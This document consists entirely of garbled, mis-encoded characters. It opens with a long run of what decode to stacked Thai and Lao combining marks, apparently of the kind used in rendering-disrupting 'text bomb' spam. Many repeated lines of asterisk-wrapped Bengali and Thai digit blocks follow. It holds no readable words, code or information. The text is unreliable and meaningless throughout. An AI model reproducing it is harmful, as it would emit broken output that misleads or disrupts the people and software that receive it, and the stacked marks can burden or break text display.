§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£§à£©à£©à£©à£©à£©à£©à£©à£©à£©à£©à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¨à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à£¤à¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Šà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹Œà¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹à¹‹àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº·àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶àº¶áª´áª´áª´áª´áª´áª´áª´áª´áª´áª´áª´áª´áª´áª´áª´  
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à§­à§­à§­à§­à§­à§­à§­à§­* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à§­à§­à§­à§­à§­à§­à§­à§­*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘* *à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’*
*à¹’à¹’à¹’à¹’à¹’à¹’à¹’à¹’* *à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘à¹‘*
